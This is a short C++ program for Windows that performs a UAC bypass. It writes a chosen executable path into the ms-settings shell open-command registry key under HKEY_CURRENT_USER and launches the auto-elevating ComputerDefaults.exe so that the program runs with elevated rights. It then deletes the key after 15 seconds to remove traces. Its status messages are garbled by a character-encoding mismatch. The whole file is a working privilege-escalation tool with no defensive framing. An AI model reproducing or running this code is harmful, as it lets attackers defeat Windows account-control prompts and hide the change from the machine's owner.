#include <iostream>
#include <windows.h>
#include <thread>
using namespace std;

bool CreateReg(const std::wstring& targetPath) {
    HKEY hKey;
    LONG createResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (createResult == ERROR_SUCCESS) {
        LONG setResult = RegSetValueExW(hKey, NULL, 0, REG_SZ, reinterpret_cast<const BYTE*>(targetPath.c_str()), (targetPath.length() + 1) * sizeof(wchar_t));
        if (setResult == ERROR_SUCCESS) {
            LONG delegateResult = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), (wcslen(L"") + 1) * sizeof(wchar_t));
            if (delegateResult != ERROR_SUCCESS) {
                return false;
            }
        }
        else {
            RegCloseKey(hKey);
            return false;
        }
    }
    return true;
}

void clearReg() {
    LPCWSTR subkey = L"Software\\Classes\\ms-settings";
    LONG result = RegDeleteKey(HKEY_CURRENT_USER, subkey);
    if (result == ERROR_SUCCESS) {
        printf("�ɹ�ɾ��ע������\n");
    }
    else {
        printf("�޷�ɾ��ע������������룺%d\n", result);
    }
}

int main(int argc, char* argv[])
{
    if (argc == 2) {
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
        std::wstring targetpath(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, &targetpath[0], size_needed);

        if (CreateReg(targetpath)) {
            printf_s("ע������ɹ�\n");
            ShellExecute(NULL, L"open", L"ComputerDefaults.exe", NULL, NULL, SW_SHOWNORMAL);

            // �ȴ�15��
            std::this_thread::sleep_for(std::chrono::seconds(15));

            clearReg();
        }
        else {
            printf_s("ע�����ʧ��\n");
            clearReg();
        }

    }
    else {
        printf_s("�������������\n");
    }

    system("pause");
    return 0;
}

